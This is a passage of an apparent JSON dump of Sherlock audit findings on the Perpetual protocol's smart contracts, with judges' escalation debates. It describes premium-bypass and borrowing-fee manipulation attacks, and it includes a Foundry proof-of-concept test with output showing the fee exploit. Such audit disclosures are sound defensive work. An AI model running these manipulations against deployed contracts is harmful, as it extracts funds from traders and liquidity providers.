Snippet\n\nhttps://github.com/sherlock-audit/2024-02-perpetual/blob/02f17e70a23da5d71364268ccf7ed9ee7cedf428/perp-contract-v3/src/clearingHouse/ClearingHouse.sol#L267-L356\n\nhttps://github.com/sherlock-audit/2024-02-perpetual/blob/02f17e70a23da5d71364268ccf7ed9ee7cedf428/perp-contract-v3/src/clearingHouse/ClearingHouse.sol#L488-L524\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nThe best solution is to implement liquidation for whitelisted maker. If not possible, you can mitigate the issue with larger margin requirement for whitelisted makers.\n\n\n\n## Discussion\n\n**sherlock-admin4**\n\n1 comment(s) were left on this issue during the judging contest.\n\n**takarez** commented:\n>  the natsepc says that liquidating whitelisted maker is not allwoed, so i will considered this a know issue\n\n\n\n**vinta**\n\nAgree with takarez that this is a known issue.\n\n**sherlock-admin2**\n\n> Escalate\n> \n> According to the Sherlock docs, the Sherlock rules for valid issues have more weight than the code comments:\n> \n> > Hierarchy of truth: Contest README > Sherlock rules for valid issues > protocol documentation (including code comments) > protocol answers on the contest public Discord channel.\n> While considering the validity of an issue in case of any conflict the sources of truth are prioritized in the above order.\n> \n> Given that this issue is not mentioned in the contest README and clearly demonstrates that it will cause a loss of funds, I think it should be considered a valid issue, as well as its duplicates. \n\nYou've deleted an escalation for this issue.\n\n**IllIllI000**\n\n@santipu03 nowhere does it say that there's a guarantee that the makers will provide liquidity 100% of the time, and in any market, if there's no liquidity at the price you want, that's a you problem, not a security issue. There are expected to be other market participants who can provide liquidity for closing positions, and even if bad debt does occur, the system allows for and tracks it. Just looking at the code, not just the comments, it [expects](https://github.com/sherlock-audit/2024-02-perpetual/blob/main/perp-contract-v3/src/clearingHouse/ClearingHouse.sol#L166-L168) that whitelisted makers can't be liquidated, so it's not clear that anything in the design is being violated. I agree that the hierarchy is a bit confusing and I would like it to be updated and clarified, but if this escalation can be closed on facts not relating specifically to the ambiguities in the hierarchy, I think we may not get such an update.\n\n**santipu03**\n\n@IllIllI000 Now that I have checked better the 3 duplicated issues, only my issue (#65) describes the full and valid impact: **Whitelisted makers that cannot be liquidated will generate bad debt on the protocol**, creating a loss for all users. \n\nYou're right that the intended design is to not liquidate whitelisted makers, but that will create bad debt on the protocol, and therefore cause a loss of funds. The Sherlock docs state that design decisions are not valid issues if they don't imply any loss of funds, but this issue will imply a loss of funds and therefore should be valid. \n\nI will remove my escalation here and I will escalate my issue (#65). \n\n**gstoyanovbg**\n\nEscalate\n\nThe previous escalation was removed because the Watson decided that theirs issue is not duplicate of this one. This is why i escalate it again.\n\n> Hierarchy of truth: Contest README > Sherlock rules for valid issues > protocol documentation (including code comments) > protocol answers on the contest public Discord channel.\nWhile considering the validity of an issue in case of any conflict the sources of truth are prioritized in the above order.\n\nThe hierarchy of truth clearly states that contest's README has more weight than code comments. This issue is not part of the known issues section of the README so it is not known issue in the context of the contest.\n\nI believe it is a valid issue.\n\n**sherlock-admin2**\n\n> Escalate\n> \n> The previous escalation was removed because the Watson decided that theirs issue is not duplicate of this one. This is why i escalate it again.\n> \n> > Hierarchy of truth: Contest README > Sherlock rules for valid issues > protocol documentation (including code comments) > protocol answers on the contest public Discord channel.\n> While considering the validity of an issue in case of any conflict the sources of truth are prioritized in the above order.\n> \n> The hierarchy of truth clearly states that contest's README has more weight than code comments. This issue is not part of the known issues section of the README so it is not known issue in the context of the contest.\n> \n> I believe it is a valid issue.\n\nYou've created a valid escalation!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**nevillehuang**\n\nAgree with @IllIllI000 comments [here](https://github.com/sherlock-audit/2024-02-perpetual-judging/issues/140#issuecomment-2039482116), I believe it is a known issue within code comments that whitelisted maker cannot be liquidated\n\n**WangSecurity**\n\nAgree with LSW and the Lead Judge. The hierarchy of truth can be applied when there is conflicting information between the code and the rules, but the code and documentation can be used to define the intended design and known issues of the protocol. We understand that it's a bit confusing, but hope for your understanding. Therefore, I agree it's an intended design and a known issue.\n\nPlanning to reject the escalation and leave the issue as it is.\n\n**Evert0x**\n\nResult:\nInvalid\nHas Duplicates\n\n**sherlock-admin4**\n\nEscalations have been resolved successfully!\n\nEscalation status:\n- [gstoyanovbg](https://github.com/sherlock-audit/2024-02-perpetual-judging/issues/140/#issuecomment-2041339059): rejected\n\n**gstoyanovbg**\n\n> Agree with LSW and the Lead Judge. The hierarchy of truth can be applied when there is conflicting information between the code and the rules, but the code and documentation can be used to define the intended design and known issues of the protocol. We understand that it's a bit confusing, but hope for your understanding. Therefore, I agree it's an intended design and a known issue.\n> \n> Planning to reject the escalation and leave the issue as it is.\n\nFrom Watson's point view there is no way to know when this rule should be applied and when shouldn't. Everyone interpreted it differently.\n\n> // We don't allow liquidating whitelisted makers for now until we implement safety mechanism\n        // For spot-hedged base maker, it needs to implement rebalance once it got liquidated\n\nNowhere is stated that this cause other issues neither in the comment or in the known issues section. Moreover this line from the rules :\n\n> Hierarchy of truth: Contest README > Sherlock rules for valid issues > protocol documentation (including code comments) > protocol answers on the contest public Discord channel.\nWhile considering the validity of an issue in case of any conflict the sources of truth are prioritized in the above order.\n\nunambiguously say that the README has more weight than \"protocol documentation (including code comments)\". In your comment you say that \n\n> The hierarchy of truth can be applied when there is conflicting information between the code and the rules\n\nbut this is not true according to the above rule which states that the conflict may be between ALL sources of truth : \n\n> While considering the validity of an issue in case of any conflict **the sources of truth are prioritized in the above order**.\n\nSo i don't understand the decision - from my point of view i am penalized with worsen ratio because follow the rules and interpret them in the way they are written.\n\n**santipu03**\n\n@gstoyanovbg I totally agree with you, I think in this contest the judges suddenly have decided to make decisions against the current hierarchy of truth. I've got a couple of issues that have been rejected that also should be valid based on the **current** hierarchy, damaging my issues ratio and escalations ratio. \n\n@WangSecurity @Evert0x \nIf you have decided now that the hierarchy of truth must be changed, that's totally fair. However, these new changes should be applied to contests still not finished, not to a contest that has already finished like this one. I think it's greatly unfair that these changes haven't been announced anywhere and now some Watsons are suffering its consequences.\n\nI don't mean anything here in a bad way, I honestly think Sherlock always has been characterized by its transparent and fair judging, so that's why now I'm surprised by these sudden changes in the rules. I would like to kindly ask the judges to reconsider some decisions that have been made during these last days to issues regarding \"_known issues_\" vaguely described by a few code comments. Thanks.\n\n**IllIllI000**\n\n@santipu03 and @gstoyanovbg while I agree that the hierarchy is unclear, it was discussed here: https://github.com/sherlock-audit/2024-03-vvv-vesting-staking-judging/issues/148#issuecomment-2045743718 and I believe the current judge is interpreting things in a similar way\n\n**santipu03**\n\n> @santipu03 and @gstoyanovbg while I agree that the hierarchy is unclear, it was discussed here: https://github.com/sherlock-audit/2024-03-vvv-vesting-staking-judging/issues/148#issuecomment-2045743718 and I believe the current judge is interpreting things in a similar way\n\nI think there's a fundamental difference between the referenced discussion and the scenario we have here. Even if we consider that the code comments describe this scenario as a known issue, which I don't agree btw, we still have conflicting information between the code comments and the Sherlock rules. \n\nSimply put, I think there is a conflict because the rules are saying this issue should be a MEDIUM (because it causes a loss of funds), and the code comments are _saying_ that this issue should be INVALID (known issue). To me, this is conflicting information and the Sherlock rules should have priority over the code comments, as the hierarchy states.\nCC. @WangSecurity and @Evert0x.",
      "summary": "\nThis bug report is about a vulnerability found by several users where a whitelisted maker cannot be liquidated, leading to losses for traders. This happens because the current implementation does not allow for liquidation of whitelisted makers, even when they have accumulated large losses. As a result, traders are unable to close their positions and withdraw their profits, resulting in losses. The vulnerability can be reproduced by following a specific scenario where a trader opens a long position against a whitelisted maker and the price increases significantly, causing the maker to incur large losses. The only solution is for liquidity providers to deposit additional collateral, which is not a viable option. The impact of this bug is a loss of funds for the trader and broken core functionality. The code snippet and tool used for this report were a manual review. The recommendation is to either implement liquidation for whitelisted makers or increase the margin requirement for them. There was a discussion among the judges about whether this should be considered a valid issue, as it is mentioned in the code comments as a known issue. However, it was decided that the hierarchy of truth prioritizes the contest README over code comments, making this a valid issue. After further discussion, it was decided that this issue should be considered a known issue and not a valid issue. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Perpetual",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2024-02-perpetual-judging/issues/140",
      "tags": [],
      "finders": [
        "0xumarkhatab",
        "santipu\\_",
        "ge6a"
      ]
    },
    {
      "id": "32174",
      "title": "M-11: Incorrect premium calculation in OracleMaker",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2024-02-perpetual-judging/issues/137 \n\nThe protocol has acknowledged this issue.\n\n## Found by \njokr\n## Summary\n Position rate should not be influenced by free collateral of the OracleMaker\n\n## Vulnerability Detail\nPosition rate determines the exposure of OracleMaker. Position rate is used to determine the amount of premium based on the current oracleMaker position. \n\nFor ex: If maker has 100 ETH long position and if a user wants to open a short then the price which he has to open will be less than actual market price. If user takes the long, then its in favour of oracleMaker, so no premium will be imposed \n\nHere is how the position rate is being calculated\n\n```solidity\n    function _getPositionRate(uint256 price) internal view returns (int256) {\n        IVault vault = _getVault();\n        uint256 marketId_ = _getOracleMakerStorage().marketId;\n        // accountValue = margin + unrealisedPnl\n        int256 accountValue = vault.getAccountValue(marketId_, address(this), price);\n        int256 unrealizedPnl = vault.getUnrealizedPnl(marketId_, address(this), price);\n        int256 unsettledMargin = accountValue - unrealizedPnl;\n        int256 collateralForOpen = FixedPointMathLib.min(unsettledMargin, accountValue);\n        // TODO: use positionMarginRequirement\n        //int256 collateralForOpen = positionMarginRequirement + freeCollateralForOpen;\n        if (collateralForOpen <= 0) {\n            revert LibError.NegativeOrZeroMargin();\n        }\n\n        int256 maxPositionNotional = (collateralForOpen * 1 ether) / _getOracleMakerStorage().minMarginRatio.toInt256();\n\n        // if maker has long position, positionRate > 0\n        // if maker has short position, positionRate < 0\n        int256 openNotional = vault.getOpenNotional(marketId_, address(this));\n        int256 uncappedPositionRate = (-openNotional * 1 ether) / maxPositionNotional;\n\n        // util ratio: 0 ~ 1\n        // position rate: -1 ~ 1\n        return\n            uncappedPositionRate > 0\n                ? FixedPointMathLib.min(uncappedPositionRate, 1 ether)\n                : FixedPointMathLib.max(uncappedPositionRate, -1 ether);\n    }\n\n```\nThe problem here is the `uncappedPositionRate` also depends on `maxPositionNotional`. `maxPositionNotional` is the maximum openNotional possible for current `openCollateral` of oracleMaker with given `minMarginRatio`.\n\n`int256 uncappedPositionRate = (-openNotional * 1 ether) / maxPositionNotional;`\n\nSo in this case if the `freeCollateral` is more in the oracle maker than the premium becomes proportionally low which is not correct.\n\nConsider this scenario\n Currently oracleMaker has 100 ETH short position. If a user wants to take a 10 ETH long position there must premium against user. So the reservation price at which user opens will be higher than market price. \n \nNow the user deposits large amount of collateral as LP. As the. freeCollateral increases, for sufficient collateral  given the premium free decreases proportionally. After the user opens the position with less premium, he just withdraws the collateral back. Thus bypassing the premium enforced by oracle maker\n\nThis is possible by considering free collateral while calculating the position rate. Position rate should solely depend on openNotional and not on free collateral in any way\n\n## Impact\nIncorrect handling of risk exposure \n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2024-02-perpetual/blob/main/perp-contract-v3/src/maker/OracleMaker.sol#L411\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nModify the position rate calculation by excluding `maxPositionNotional`\n\n\n\n## Discussion\n\n**sherlock-admin3**\n\n1 comment(s) were left on this issue during the judging contest.\n\n**santipu_** commented:\n> Medium\n\n\n\n**rc56**\n\n@CheshireCatNick\n- Won't fix for now. Will improve in the future. One potential solution is to implement a time lock when deposit / withdraw into makers.\n- It is true that the trick (deposit -> open position -> withdraw) could bypass OracleMaker's spread, but the impact is considered a degradation (high risk exposure without proper compensation) of maker performance instead of a critical vulnerability.\n- Also, oracle maker requires order being delayed. Attacker cannot deposit, open position and withdraw in the same tx. Thus, this attack is not completely risk-free.\n- Note the maker has minMarginRatio which protects it from taking too much exposure. The parameter had been set conservative (minMarginRatio = 100%) from the start so we have extra safety margin to observe its real-world performance and improve it iteratively.\n\n**CheshireCatNick**\n\nAlso in the beginning we only allow whitelisted users to deposit to maker.\n\n**IllIllI000**\n\n@rc56, @CheshireCatNick, and @42bchen if you disagree that this is a High, can you let us know what severity you think this should be, and apply the disagree-with-severity tag? It seems similar to https://github.com/sherlock-audit/2024-02-perpetual-judging/issues/127 in that the LP deposits/withdrawals can be used to game what users have to pay",
      "summary": "\nThe issue reported is about incorrect premium calculation in the OracleMaker protocol. The position rate, which determines the exposure of OracleMaker, is being influenced by the free collateral of the protocol. This means that if a user deposits a large amount of collateral as an LP, the premium they have to pay when opening a position becomes proportionally lower. This allows users to bypass the premium enforced by OracleMaker by withdrawing their collateral after opening a position. This vulnerability could lead to incorrect risk exposure for the protocol. The code snippet responsible for this issue is provided and the recommendation is to modify the position rate calculation by excluding the factor of maximum openNotional. The tool used for this report is manual review. During the judging contest, one comment was left stating that this issue is of medium severity. However, the protocol developers have decided not to fix it immediately, but to improve it in the future. They also mention that the impact of this vulnerability is considered a degradation of the protocol's performance, rather than a critical vulnerability. They also mention that the protocol has safety measures in place, such as a minimum margin ratio, to protect against excessive risk exposure. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Perpetual",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2024-02-perpetual-judging/issues/137",
      "tags": [],
      "finders": [
        "jokr"
      ]
    },
    {
      "id": "32173",
      "title": "M-10: Borrow fees can be arbitrarily increased without the maker providing any value",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2024-02-perpetual-judging/issues/126 \n\nThe protocol has acknowledged this issue.\n\n## Found by \nIllIllI\n## Summary\n\nThe SpotHedgeBaseMaker LPs can maximize their LP returns by closing their trades against other whitelisted makers\n\n\n## Vulnerability Detail\n\nThe [whitelisted makers](https://perp.notion.site/Borrowing-Fee-Spec-v0-8-0-22ade259889b4c30b59762d582b4336d), which the SpotHedgeBaseMaker and the OracleMaker are, `[c]an receive borrowing fee based on [their] utilization ratio` and `[d]on’t need to pay borrowing fee` themselves. The borrowing fee is meant to be compensation for providing liquidity to the market, but makers like the SpotHedgeBaseMaker, which are able to hedge their position risk, can arbitrarily increase their utilization ratio by opening positions against the OracleMaker, and immediately closing them against the SpotHedgeBaseMaker, maximizing their fees without having to provide liquidity over time.\n\nAn attacker can choose a specific market direction, then monitor the utilization of the OracleMaker. Any time the OracleMaker's utilization is flat, the attacker would open a position in the chosen market direction against the OracleMaker (to minimize the dynamic premium), then immediately close the position by offsetting it with a taker order against the SpotHedgeBaseMaker. The only risk the attacker has to take is holding the position for the approximately ~2 second optimism block time, until they're able to offset the position using the ClearingHouse to interact directly with the SpotHedgeBaseMaker.\n\n## Impact\n\nValue extraction in the form of excessive fees, at the expense of traders on the other side of the chosen position direction.\n\n\n## Code Snippet\n\nUtilization does not take into account whether the taker is reducing their position, only that the maker is increasing theirs:\n```solidity\n// File: src/borrowingFee/LibBorrowingFee.sol : LibBorrowingFee.updateReceiverUtilRatio()   #1\n\n40            /// spec: global_ratio = sum(local_ratio * local_open_notional) / total_receiver_open_notional\n41            /// define factor = local_ratio * local_open_notional; global_ratio = sum(factor) / total_receiver_open_notional\n42            /// we only know 1 local diff at a time, thus splitting factor to known_factor and other_factors\n43            /// a. old_global_ratio = (old_factor + sum(other_factors)) / old_total_open_notional\n44            /// b. new_global_ratio = (new_factor + sum(other_factors)) / new_total_open_notional\n45            /// every numbers are known except new_global_ratio. sum(other_factors) remains the same between old and new\n46            /// expansion formula a: sum(other_factors) = old_global_ratio * old_total_open_notional - old_factor\n47            /// replace sum(other_factors) in formula b:\n48            /// new_global_ratio = (new_factor + old_global_ratio * old_total_open_notional - old_factor) / new_total_open_notional\n49            uint256 oldUtilRatioFactor = self.utilRatioFactorMap[receiver];\n50 @>         uint256 newTotalReceiverOpenNotional = self.totalReceiverOpenNotional;\n51            uint256 oldUtilRatio = self.utilRatio;\n52            uint256 newUtilRatio = 0;\n53            if (newTotalReceiverOpenNotional > 0) {\n54                // round up the result to prevent from subtraction underflow in next calculation\n55 @>             newUtilRatio = FixedPointMathLib.divUp(\n56                    oldUtilRatio * self.lastTotalReceiverOpenNotional + newUtilRatioFactor - oldUtilRatioFactor,\n57                    newTotalReceiverOpenNotional\n58                );\n59:           }   \n```\nhttps://github.com/sherlock-audit/2024-02-perpetual/blob/main/perp-contract-v3/src/borrowingFee/LibBorrowingFee.sol#L40-L59\n\nand [whitelisted makers](https://github.com/sherlock-audit/2024-02-perpetual/blob/main/perp-contract-v3/src/borrowingFee/BorrowingFee.sol#L299-L303) never have to pay any fee:\n```solidity\n// File: src/borrowingFee/BorrowingFee.sol : BorrowingFee.getPendingFee()   #2\n\n165        function getPendingFee(uint256 marketId, address trader) external view override returns (int256) {\n166 @>         if (_isReceiver(marketId, trader)) {\n167                return _getPendingReceiverFee(marketId, trader);\n168            }\n169            return _getPendingPayerFee(marketId, trader);\n170:       }\n```\nhttps://github.com/sherlock-audit/2024-02-perpetual/blob/main/perp-contract-v3/src/borrowingFee/BorrowingFee.sol#L165-L170\n\n\n## Tool used\n\nManual Review\n\n\n## Recommendation\n\nThere is no incentive to reduce utilization, and I don't see a good solution that doesn't involve the makers having to actively re-balance their positions, e.g. force makers to also have to pay the fee, and only pay the fee to the side that has the largest net non-maker open opposite position\n\n\n\n\n## Discussion\n\n**sherlock-admin2**\n\n1 comment(s) were left on this issue during the judging contest.\n\n**santipu_** commented:\n> Medium/Low - Attacker's position may be closed with some losses due to slippage closing the position against SpotHedgeBaseMaker\n\n\n\n**42bchen**\n\nBy doing this, the attacker will risk losing money because he needs to relay the position to our relayer, and he can't guarantee that this operation is profitable. Also, arbitrage between maker and maker is expected in our system.\n\n**IllIllI000**\n\n@42bchen the position only has to be open for one block so the position risk is small. The attacker gains value from the LP borrow fees over time that accrue well past the point at which they close the trade, not from the position itself. Every user on one side is affected by the higher fees, so even if the whole trade is a loss for the attacker, they've still gotten all other users to pay higher fees, which is a loss of funds for them. Also, [this](https://github.com/sherlock-audit/2024-02-perpetual-judging/issues/133) one was marked as a valid high, and has the same gap risk\n\n**42bchen**\n\n> @42bchen the position only has to be open for one block so the position risk is small. The attacker gains value from the LP borrow fees over time that accrue well past the point at which they close the trade, not from the position itself. Every user on one side is affected by the higher fees, so even if the whole trade is a loss for the attacker, they've still gotten all other users to pay higher fees, which is a loss of funds for them. Also, [this](https://github.com/sherlock-audit/2024-02-perpetual-judging/issues/133) one was marked as a valid high, and has the same gap risk\n\nupdate to confirmed, and we think using whitelistLp (only us) can decrease the incentive of attackers to do that, not yet figured out a better way (or easy way) to handle this issue, if you have any suggestions for solving this, please let us know, thank you 🙏\n\n**nirohgo**\n\nEscalate\nShould be Invalid.\n\nThis attack in unrealistic and will never be profitable. Here is why:\n\n1. The attack has the cost of negative PnL due to price difference between Oracle Maker (Pyth price at best) and SpotHedgeBaseMaker (Uniswap slippage). The bigger the investment in skewing the borrow rate, the higher the cost.\n2. skewing the utilization rate on Oracle Maker also skews the Funding Rate (more extremely since funding rate is affected non-linearly). This will cause market forces to rebalance the Oracle Maker (thus bringing its utilization rate back down) probably within minutes, and surely no longer than a day. \n3. The cost of attack is order of magnitudes higher then the additional fees over the period of time it has effect. For example: \nUnder these assumptions:  \nA. Uniswap Pool base Liquidity 1000 Eth  \nB. Oracle maker Liquidity: 1M$  \nC. SpotHedgeBaseMaker Liquidity: 1M$  \nD. MinMarginRatio: 100%  \nE. 100,000 USD open notional (that pays borrow fees) in the system.  \nF. Borrow Fees (unitization rates) are rebalanced within 24 hours.  \nG. max borrow fee per year: ~30% (0.00000001 per second).\nUnder the above assumptions the maximum amount that can be used to push the utilization rate is 1M$.  \nThe borrow fees gains from pushing utilization rates to the maximum over a day are at most $86.4\nThe slippage loss from opening and closing the positions that push utilization rate is ~$318000\nEven if we stretch some of the assumptions (i.e. less slippage on uniswap, more open notional) the attack is not anywhere near profitable.\n\n4. There are other hidden assumptions here, such as that the two makers liquidity is similar (otherwise you can't push utilization rate of both makers to the max while staying neutral) but I believe the above is sufficient to make the point.\n\n**sherlock-admin2**\n\n> Escalate\n> Should be Invalid.\n> \n> This attack in unrealistic and will never be profitable. Here is why:\n> \n> 1. The attack has the cost of negative PnL due to price difference between Oracle Maker (Pyth price at best) and SpotHedgeBaseMaker (Uniswap slippage). The bigger the investment in skewing the borrow rate, the higher the cost.\n> 2. skewing the utilization rate on Oracle Maker also skews the Funding Rate (more extremely since funding rate is affected non-linearly). This will cause market forces to rebalance the Oracle Maker (thus bringing its utilization rate back down) probably within minutes, and surely no longer than a day. \n> 3. The cost of attack is order of magnitudes higher then the additional fees over the period of time it has effect. For example: \n> Under these assumptions:  \n> A. Uniswap Pool base Liquidity 1000 Eth  \n> B. Oracle maker Liquidity: 1M$  \n> C. SpotHedgeBaseMaker Liquidity: 1M$  \n> D. MinMarginRatio: 100%  \n> E. 100,000 USD open notional (that pays borrow fees) in the system.  \n> F. Borrow Fees (unitization rates) are rebalanced within 24 hours.  \n> G. max borrow fee per year: ~30% (0.00000001 per second).\n> Under the above assumptions the maximum amount that can be used to push the utilization rate is 1M$.  \n> The borrow fees gains from pushing utilization rates to the maximum over a day are at most $86.4\n> The slippage loss from opening and closing the positions that push utilization rate is ~$318000\n> Even if we stretch some of the assumptions (i.e. less slippage on uniswap, more open notional) the attack is not anywhere near profitable.\n> \n> 4. There are other hidden assumptions here, such as that the two makers liquidity is similar (otherwise you can't push utilization rate of both makers to the max while staying neutral) but I believe the above is sufficient to make the point.\n\nYou've created a valid escalation!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**IllIllI000**\n\n1. Most attacks have some cost, so that's not a good reason to invalidate an issue. This attack can be done over time so as to minimize the impact on the uniswap pool. There is a profit to be had here as is described above but even if there weren't, Sherlock rules don't require a profit if other users get a loss, and extra unwarranted borrow fees are a definite loss to other users.\n2. The escalating watson seems to have misunderstood the attack. They write `This will cause market forces to re-balance the Oracle Maker (thus bringing its utilization rate back down) probably within minutes, and surely no longer than a day.` but the second paragraph of the `Vulnerability Detail` section describes that this is the desired behavior, because the attack is for the benefit of the SHBM LPs, _not_ the OM LPs\n\n**nirohgo**\n\n> 1. Most attacks have some cost, so that's not a good reason to invalidate an issue. This attack can be done over time so as to minimize the impact on the uniswap pool. There is a profit to be had here as is described above but even if there weren't, Sherlock rules don't require a profit if other users get a loss, and extra unwarranted borrow fees are a definite loss to other users.\n\nBe that as it may, an attack that spends $318,000 to cause $86 loss does not count as a feasible attack/valid medium.\n\n> The escalating watson seems to have misunderstood the attack. They write This will cause market forces to re-balance the Oracle Maker (thus bringing its utilization rate back down) probably within minutes, and surely no longer than a day. but the second paragraph of the Vulnerability Detail section describes that this is the desired behavior, because the attack is for the benefit of the SHBM LPs, not the OM LPs\n\nI don't think I misunderstood the attack. The borrowing fee rate is calculated based on the **overall utilization rate** of all Receivers (both the Oracle Maker and SHBM). What I meant is that at least half of the fabricated utilization rate that affects the fee rate (the part that's on the OM side) won't last long. In any event, my calculation of the gains was based on the attack effects lasting a full day. By then the utilization rate is expected re-balance on both makers (if borrowing rate is exceptionally high, either more LPs will enter, or positions will be closed). The point is that this is not a one-block attack. For it to feasible, the effect of the fabricated utilization need to last for a very long time, which won't happen.\n\n\n\n**IllIllI000**\n\n> Be that as it may, an attack that spends $318,000 to cause $86 loss does not count as a feasible attack/valid medium.\n\n> I don't think I misunderstood the attack\n\nNot sure where you're getting the arbitrary number of 318000 as the cost, when the position is only open for ~2 seconds and is only repeatedly done when there's liquidity. Also, 'expected to' sounds like a big assumption, when the attacker is actively pushing in one direction\n\n**nevillehuang**\n\n@IllIllI000 Could you provide a scenario/PoC to demonstrate the relative loss here so I can verify?\n\n**IllIllI000**\n\n@nevillehuang This is a slight modification of nirohgo's POC for https://github.com/sherlock-audit/2024-02-perpetual-judging/issues/133\n```solidity\n// SPDX-License-Identifier: GPL-3.0-or-later\npragma solidity >=0.8.0;\n\nimport \"forge-std/Test.sol\";\nimport \"../spotHedgeMaker/SpotHedgeBaseMakerForkSetup.sol\";\nimport { OracleMaker } from \"../../src/maker/OracleMaker.sol\";\nimport \"../../src/common/LibFormatter.sol\";\nimport { SignedMath } from \"@openzeppelin/contracts/utils/math/SignedMath.sol\";\n\ncontract FundingFeeExploit is SpotHedgeBaseMakerForkSetup {\n\n    using LibFormatter for int256;\n    using LibFormatter for uint256;\n    using SignedMath for int256;\n\n    address public taker = makeAddr(\"Taker\");\n    address public exploiter = makeAddr(\"Exploiter\");\n    OracleMaker public oracle_maker;\n\n    function setUp() public override {\n        super.setUp();\n        //create oracle maker\n        oracle_maker = new OracleMaker();\n        _enableInitialize(address(oracle_maker));\n        oracle_maker.initialize(marketId, \"OM\", \"OM\", address(addressManager), priceFeedId, 1e18);\n        config.registerMaker(marketId, address(oracle_maker));\n\n        //PARAMETERS SETUP\n\n        //fee setup\n        //funding fee configs (taken from team tests) \n        config.setFundingConfig(marketId, 0.005e18, 1.3e18, address(oracle_maker));\n        //borrowing fee 0.00000001 per second as in team tests\n        config.setMaxBorrowingFeeRate(marketId, 10000000000, 10000000000);\n        oracle_maker.setMaxSpreadRatio(0.1 ether); // 10% as in team tests\n        \n\n        //whitelist users\n        oracle_maker.setValidSender(exploiter,true);\n        oracle_maker.setValidSender(taker,true);\n        \n\n        //add more liquidity ($20M) to uniswap pool to simulate realistic slippage\n        deal(address(baseToken), spotLp, 10000e9, true);\n        deal(address(collateralToken), spotLp, 20000000e6, true);\n        vm.startPrank(spotLp);\n        uniswapV3NonfungiblePositionManager.mint(\n            INonfungiblePositionManager.MintParams({\n                token0: address(collateralToken),\n                token1: address(baseToken),\n                fee: 3000,\n                tickLower: -887220,\n                tickUpper: 887220,\n                amount0Desired: collateralToken.balanceOf(spotLp),\n                amount1Desired: baseToken.balanceOf(spotLp),\n                amount0Min: 0,\n                amount1Min: 0,\n                recipient: spotLp,\n                deadline: block.timestamp\n            })\n        );\n\n        //mock the pyth price to be same as uniswap (set to ~$2000 in base class)\n        pyth = IPyth(0xff1a0f4744e8582DF1aE09D5611b887B6a12925C);\n        _mockPythPrice(2000,0);\n    }\n\n\n    function testBorrowingFeePOC() public {\n       \n\n        //deposit 5M collateral as margin for exploiter (also mints the amount)\n        uint256 startQuote = 5000000*1e6;\n       _deposit(marketId, exploiter, startQuote);\n       console.log(\"Exploiter Quote balance at Start: %s\\n\", startQuote);\n\n        //deposit to makers\n        //initial HSBM maker deposit: 2000 base tokens ($4M)\n       vm.startPrank(makerLp);\n       deal(address(baseToken), makerLp, 2000*1e9, true);\n       baseToken.approve(address(maker), type(uint256).max);\n       maker.deposit(2000*1e9);\n\n       //initial oracle maker deposit: $2M (1000 base tokens)\n       deal(address(collateralToken), makerLp, 2000000*1e6, true); \n       collateralToken.approve(address(oracle_maker), type(uint256).max);\n       oracle_maker.deposit(2000000*1e6);\n       vm.stopPrank();\n\n       //Also deposit collateral directly to SHBM to simulate some existing margin on the SHBM from previous activity\n       _deposit(marketId, address(maker), 2000000*1e6);\n\n       int256 exploiterPosSizeStart = vault.getPositionSize(marketId,address(exploiter));\n       console.logInt(exploiterPosSizeStart);\n\n       //Exploiter opens -1 base tokens long on oracle maker\n        vm.startPrank(exploiter);\n        (int256 posBase, int256 openNotional) = clearingHouse.openPosition(\n            IClearingHouse.OpenPositionParams({\n                marketId: marketId,\n                maker: address(oracle_maker),\n                isBaseToQuote: false,\n                isExactInput: false,\n                amount: 1*1e18,\n                oppositeAmountBound:type(uint256).max,\n                deadline: block.timestamp,\n                makerData: \"\"\n            })\n        );\n\n        console.log(\"Utilization after short (long, short):\");\n        (uint256 utilLong, uint256 utilShort) = borrowingFee.getUtilRatio(marketId);\n        console.log(utilLong, utilShort);\n\n        //move to next block\n        vm.warp(block.timestamp + 2 seconds);\n\n        //Exploiter closes the short against the SHBM to increase the ratio\n        int256 exploiterPosSize = vault.getPositionSize(marketId,address(exploiter));\n        (posBase,openNotional) = clearingHouse.openPosition(\n            IClearingHouse.OpenPositionParams({\n                marketId: marketId,\n                maker: address(maker),\n                isBaseToQuote: true,\n                isExactInput: true,\n                amount: 1 * 1e18,\n                oppositeAmountBound:0,\n                deadline: block.timestamp,\n                makerData: \"\"\n            })\n        );\n\n        //exploiter withdraws entirely\n        int256 upDec = vault.getUnsettledPnl(marketId,address(exploiter));\n        int256 stDec = vault.getSettledMargin(marketId,address(exploiter));\n        int256 marg = stDec-upDec;\n        uint256 margAbs = marg.abs();\n        uint256 toWithdraw = margAbs.formatDecimals(INTERNAL_DECIMALS,collateralToken.decimals());\n        vault.transferMarginToFund(marketId,toWithdraw);\n        vault.withdraw(vault.getFund(exploiter));\n        vm.stopPrank();\n\n       int256 exploiterPosSizeFinish = vault.getPositionSize(marketId,address(exploiter));\n       console.logInt(exploiterPosSizeFinish);\n\n        uint256 finalQuoteBalance = collateralToken.balanceOf(address(exploiter));\n        console.log(\"Exploiter Quote balance at End: %s\", finalQuoteBalance);\n\n        (uint256 utilLong2, uint256 utilShort2) = borrowingFee.getUtilRatio(marketId);\n        console.log(utilLong2, utilShort2);\n    }\n}\n```\n\noutput:\n```text\n  Exploiter Quote balance at Start: 5000000000000\n  0\n  Utilization after short (long, short):\n  1000000000000000 0\n  0\n  Exploiter Quote balance at End: 4999993607598\n  1000000000000000 995908769461738\n```\nSo the attacker only had to spend 0.000128% in order to change the short utilization ratio from 0 to 995908769461738, with only one Eth. Note that the attacker no longer has any open position and, as is outlined in the vulnerability description, they can do this repeatedly in small amounts in order to increase the ratio arbitrarily, without incurring slippage in the uniswap pool, and they can be one of the SHMB's LPs in order to 